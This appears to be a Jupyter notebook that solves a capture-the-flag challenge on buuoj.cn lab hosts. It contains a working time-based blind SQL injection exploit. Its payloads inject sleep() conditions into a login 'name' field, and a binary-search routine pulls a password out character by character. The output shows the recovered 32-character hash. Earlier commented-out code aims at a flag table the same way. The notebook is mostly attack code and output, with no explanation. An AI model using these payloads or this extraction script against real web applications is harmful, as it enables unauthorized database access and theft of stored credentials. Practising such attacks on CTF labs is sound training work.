{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req,time,math"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# def check_chr(index:int,ord_index:int):\n",
    "#     data = {\"id\":\"1|if((select(ascii(substr(flag,{},1)))from(flag))>{},sleep(1),0)\".format(index,ord_index)}\n",
    "#     url = \"http://88f70e8a-c440-4912-a3fc-f2cb57d3d9d0.node4.buuoj.cn:81/\"\n",
    "#     st = time.time()\n",
    "#     resp = req.post(url,data)\n",
    "#     et = time.time()\n",
    "#     if et-st>=1:\n",
    "#         return True\n",
    "#     else:\n",
    "#         return False\n",
    "    \n",
    "# def check_eq(index:int,ord_index:int):\n",
    "#     data = {\"id\":\"1|if((select(ascii(substr(flag,{},1)))from(flag))={},sleep(1),0)\".format(index,ord_index)}\n",
    "#     url = \"http://88f70e8a-c440-4912-a3fc-f2cb57d3d9d0.node4.buuoj.cn:81/\"\n",
    "#     st = time.time()\n",
    "#     resp = req.post(url,data)\n",
    "#     et = time.time()\n",
    "#     if et-st>=1:\n",
    "#         return True\n",
    "#     else:\n",
    "#         return False\n",
    "    \n",
    "    \n",
    "def check_chr_new(url:str,data:str,method:str,resp_text:str,time_limit:int):\n",
    "    st = time.time()\n",
    "    res = False\n",
    "    if method=='POST':\n",
    "        resp = req.post(url,data)\n",
    "        if resp.text.find(resp_text)<0:\n",
    "            time.sleep(2)\n",
    "            res = check_chr_new(url,data,method,resp_text,time_limit)\n",
    "    elif method=='GET':\n",
    "        resp = req.get(url,data)\n",
    "        if resp.text.find(resp_text)<0:\n",
    "            time.sleep(2)\n",
    "            res = check_chr_new(url,data,method,resp_text,time_limit)\n",
    "    et = time.time()\n",
    "    if et-st>=time_limit:\n",
    "        res = True\n",
    "    else:\n",
    "        res = False\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data1={'name':\"admin'|if(ascii(substr(passwd,{},1))>{},sleep(1),0);#\".format(1,1),\"pw\":\"admin\"}\n",
    "url = \"http://de04050c-4ecd-4e21-a272-2dd2c684e312.node4.buuoj.cn:81/search.php\"\n",
    "method=\"POST\"\n",
    "resp_text = \"do not hack me\"\n",
    "time_limit = 1\n",
    "check_chr_new(url,data,method,resp_text,time_limit)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# def binary(flag_index:int,up_index:int,low_index:int):\n",
    "#     if check_chr(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "#         if check_eq(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "#             return math.floor(low_index+(up_index-low_index)/2)\n",
    "#         else:\n",
    "#             return binary(flag_index,up_index,math.floor(low_index+(up_index-low_index)/2))\n",
    "#     else:\n",
    "#         if check_eq(flag_index,math.floor(low_index+(up_index-low_index)/2)):\n",
    "#             return math.floor(low_index+(up_index-low_index)/2)\n",
    "#         else:\n",
    "#             return binary(flag_index,math.floor(low_index+(up_index-low_index)/2),low_index)\n",
    "    \n",
    "# def check_chr_new(url:str,data:str,method:str,resp_text:str,time_limit:int):    \n",
    "def binary2(url:str,method:str,resp_text:str,time_limit:int,flag_index:int,up_index:int,low_index:int):\n",
    "#     payloads\n",
    "    data1 = {'name':\"admin'|if(ascii(substr(passwd,{},1))>{},sleep(1),0);#\".format(flag_index,math.floor(low_index+(up_index-low_index)/2)),\"pw\":\"admin\"}\n",
    "    data2 = {'name':\"admin'|if(ascii(substr(passwd,{},1))={},sleep(1),0);#\".format(flag_index,math.floor(low_index+(up_index-low_index)/2)),\"pw\":\"admin\"}\n",
    "    if check_chr_new(url,data1,method,resp_text,time_limit):\n",
    "        return binary2(url,method,resp_text,time_limit,flag_index,up_index,math.floor(low_index+(up_index-low_index)/2))\n",
    "    else:\n",
    "        if check_chr_new(url,data2,method,resp_text,time_limit):\n",
    "            return math.floor(low_index+(up_index-low_index)/2)\n",
    "        else:\n",
    "            return binary2(url,method,resp_text,time_limit,flag_index,math.floor(low_index+(up_index-low_index)/2),low_index)    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# flag = \"flag{\"\n",
    "# for i in range(6,42):\n",
    "#     flag += chr(binary(i,127,0))\n",
    "#     print(flag)\n",
    "# flag+='}'\n",
    "# print(flag)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "c\n",
      "cd\n",
      "cdc\n",
      "cdc9\n",
      "cdc9c\n",
      "cdc9c8\n",
      "cdc9c81\n",
      "cdc9c819\n",
      "cdc9c819c\n",
      "cdc9c819c7\n",
      "cdc9c819c7f\n",
      "cdc9c819c7f8\n",
      "cdc9c819c7f8b\n",
      "cdc9c819c7f8be\n",
      "cdc9c819c7f8be2\n",
      "cdc9c819c7f8be26\n",
      "cdc9c819c7f8be262\n",
      "cdc9c819c7f8be2628\n",
      "cdc9c819c7f8be2628d\n",
      "cdc9c819c7f8be2628d4\n",
      "cdc9c819c7f8be2628d41\n",
      "cdc9c819c7f8be2628d418\n",
      "cdc9c819c7f8be2628d4180\n",
      "cdc9c819c7f8be2628d41806\n",
      "cdc9c819c7f8be2628d418066\n",
      "cdc9c819c7f8be2628d4180669\n",
      "cdc9c819c7f8be2628d41806690\n",
      "cdc9c819c7f8be2628d418066900\n",
      "cdc9c819c7f8be2628d4180669009\n",
      "cdc9c819c7f8be2628d4180669009d\n",
      "cdc9c819c7f8be2628d4180669009d2\n",
      "cdc9c819c7f8be2628d4180669009d28\n"
     ]
    }
   ],
   "source": [
    "pwd = \"\"\n",
    "url = \"http://de04050c-4ecd-4e21-a272-2dd2c684e312.node4.buuoj.cn:81/search.php\"\n",
    "method=\"POST\"\n",
    "resp_text = \"do not hack me\"\n",
    "time_limit = 1\n",
    "\n",
    "for i in range(1,33):\n",
    "    pwd += chr(binary2(url,method,resp_text,time_limit,i,127,0))\n",
    "    print(pwd)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
